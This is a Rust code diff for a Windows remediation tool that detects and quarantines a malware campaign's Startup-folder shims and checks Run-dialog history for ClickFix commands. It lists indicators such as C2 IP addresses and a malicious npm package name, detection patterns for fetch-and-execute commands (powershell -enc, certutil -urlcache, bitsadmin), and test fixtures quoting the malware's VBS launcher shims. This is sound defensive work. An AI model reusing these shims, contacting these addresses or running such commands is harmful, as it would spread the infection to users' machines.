@@ -41,6 +41,11 @@ const COMMAND_MARKERS: &[&str] = &[
     "clr_init.vbs",
     "CLR_v4.0\\Optimization",
     "CLR_v4.0/Optimization",
+    "NativeImageGen",
+    "Caches\\cversions",
+    "Caches/cversions",
+    "runtimedev-link",
+    "SSTAR_API_BASE",
     "194.11.226.41",
     "193.247.144.38",
 ];
@@ -246,6 +251,113 @@ fn sweep_tasks(dry: bool, out: &mut Vec<Action>) {
     }
 }
 
+// ---------------------------------------------------------------------------
+// The Startup folders.
+// ---------------------------------------------------------------------------
+
+/// Script extensions Windows will run from a Startup folder.
+fn is_startup_script(p: &Path) -> bool {
+    let ext = p.extension().and_then(|s| s.to_str()).unwrap_or("").to_ascii_lowercase();
+    matches!(ext.as_str(), "vbs" | "vbe" | "js" | "jse" | "wsf" | "wsh" | "bat" | "cmd" | "ps1" | "hta")
+}
+
+/// Is this Startup script one of the campaign's shims?
+///
+/// Judged on contents: it names the fake NGEN, the `Caches\cversions` drop dir,
+/// the npm loader, a C2 address - or the scanner calls it critical on its own.
+/// A genuine startup script (the user's own automation) carries none of these.
+pub fn startup_script_is_malicious(path: &Path) -> bool {
+    let Ok(data) = std::fs::read(path) else { return false };
+    if data.len() > 256 * 1024 {
+        return false;
+    }
+    let text = String::from_utf8_lossy(&data);
+    if COMMAND_MARKERS.iter().any(|m| text.contains(m)) {
+        return true;
+    }
+    file_carries_marker(path)
+}
+
+fn startup_dirs() -> Vec<PathBuf> {
+    let mut out = Vec::new();
+    if let Ok(appdata) = std::env::var("APPDATA") {
+        out.push(PathBuf::from(appdata).join(r"Microsoft\Windows\Start Menu\Programs\Startup"));
+    }
+    if let Ok(pd) = std::env::var("ProgramData") {
+        out.push(PathBuf::from(pd).join(r"Microsoft\Windows\Start Menu\Programs\StartUp"));
+    }
+    out
+}
+
+fn sweep_startup_folders(dry: bool, out: &mut Vec<Action>) {
+    for dir in startup_dirs() {
+        let Ok(entries) = std::fs::read_dir(&dir) else { continue };
+        for e in entries.flatten() {
+            let p = e.path();
+            if !p.is_file() || !is_startup_script(&p) {
+                continue;
+            }
+            if !startup_script_is_malicious(&p) {
+                continue;
+            }
+            // Read the launch line before anything is deleted: it names the
+            // stage the shim starts, which is the evidence worth keeping.
+            let target: String = std::fs::read_to_string(&p)
+                .unwrap_or_default()
+                .lines()
+                .rev()
+                .find(|l| l.contains(".Run") || l.contains("shell.Run") || l.contains("start "))
+                .unwrap_or("")
+                .trim()
+                .chars()
+                .take(200)
+                .collect();
+            let removed = if dry {
+                false
+            } else {
+                // Quarantine first, so a wrong call is always recoverable.
+                let _ = crate::healer::quarantine_file(&p, &["startup-shim"]);
+                std::fs::remove_file(&p).is_ok()
+            };
+            out.push(Action {
+                kind: "startup-shim",
+                name: p.display().to_string(),
+                target,
+                removed,
+                detail: if dry { "would remove (dry run)".into() } else if removed { "removed (original quarantined)".into() } else { "removal FAILED - remove by hand".into() },
+            });
+        }
+    }
+}
+
+/// Windows Run-dialog history: ClickFix ("verify you are human: press Win+R,
+/// Ctrl+V, Enter") leaves the pasted command here. Reported only - it is
+/// history, not persistence - but it is the clearest evidence that a fake
+/// CAPTCHA was actually executed on this machine.
+pub fn clickfix_history() -> Vec<String> {
+    let mut out = Vec::new();
+    #[cfg(windows)]
+    {
+        let q = util::run("reg", &["query", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"]);
+        if q.ok {
+            for (name, data) in parse_reg_query(&q.stdout) {
+                if name == "MRUList" {
+                    continue;
+                }
+                let d = data.trim_end_matches("\\1").to_string();
+                let l = d.to_ascii_lowercase();
+                let bad = l.contains("mshta") || l.contains("powershell") && (l.contains("-enc") || l.contains("-w hidden") || l.contains("-windowstyle hidden") || l.contains("iex") || l.contains("irm ") || l.contains("iwr ") || l.contains("downloadstring"))
+                    || l.contains("curl ") && l.contains("|") || l.contains("bitsadmin") || l.contains("certutil -urlcache") || l.contains("cmd /c start") && l.contains("http")
+                    || crate::persist::is_fetch_exec(&d).is_some();
+                if bad {
+                    out.push(d);
+                }
+            }
+        }
+    }
+    out
+}
+
 /// Find and (unless `dry`) remove the campaign's Windows persistence.
 ///
 /// A no-op on non-Windows: these vectors are Windows-only, and `reg`/`schtasks`
@@ -256,11 +368,13 @@ pub fn sweep(dry: bool) -> Vec<Action> {
     {
         sweep_run_keys(dry, &mut out);
         sweep_tasks(dry, &mut out);
+        sweep_startup_folders(dry, &mut out);
     }
     #[cfg(not(windows))]
     {
         let _ = (dry, &mut out, sweep_run_keys as fn(bool, &mut Vec<Action>));
         let _ = sweep_tasks as fn(bool, &mut Vec<Action>);
+        let _ = sweep_startup_folders as fn(bool, &mut Vec<Action>);
     }
     out
 }
@@ -268,6 +382,20 @@ pub fn sweep(dry: bool) -> Vec<Action> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn the_startup_shim_contents_are_recognised() {
+        // The MicrosoftCLROptimization.vbs shim seen in the wild: it checks for a
+        // running "NativeImageGen --svc" and relaunches the fake ngen.exe.
+        let vbs = "Set shell = CreateObject(\"Wscript.Shell\")\r\nshell.CurrentDirectory = \"C:\\Users\\me\\AppData\\Local\\Microsoft\\Windows\\Caches\\cversions\"\r\nshell.Run \"\"\"C:\\Users\\me\\AppData\\Local\\Microsoft\\CLR_v4.0\\Optimization\\ngen.exe\"\" \"\"NativeImageGen\"\" --svc\", 0, False\r\n";
+        assert!(COMMAND_MARKERS.iter().any(|m| vbs.contains(m)));
+        // The npm-loader shim.
+        let npx = "env(\"SSTAR_API_BASE\") = \"http://194.11.226.41:4000\"\r\nsh.Run \"node npx-cli.js -y runtimedev-link@latest\", 0, False";
+        assert!(COMMAND_MARKERS.iter().any(|m| npx.contains(m)));
+        // The user's own trading bot launcher is not.
+        let mine = "' Starts the MT5 data bridge silently at Windows logon.\r\nCreateObject(\"WScript.Shell\").Run \"\"\"C:\\Python314\\pythonw.exe\"\" \"\"C:\\Users\\me\\Documents\\market-signal\\python\\mt5_bridge.py\"\"\", 0, False";
+        assert!(!COMMAND_MARKERS.iter().any(|m| mine.contains(m)));
+    }
 
     #[test]
     fn a_clr_run_command_is_flagged() {
